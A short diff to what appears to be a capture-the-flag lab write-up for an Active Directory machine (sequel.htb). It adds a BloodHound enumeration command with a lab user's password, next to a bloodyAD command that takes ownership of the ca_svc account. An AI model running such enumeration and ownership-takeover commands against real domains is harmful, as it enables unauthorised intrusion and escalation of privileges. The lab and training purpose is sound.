@@ -162,6 +162,8 @@ Get the user flag!
 
 BloodHound
 
+    bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
+
 BloodyAD
 
     bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
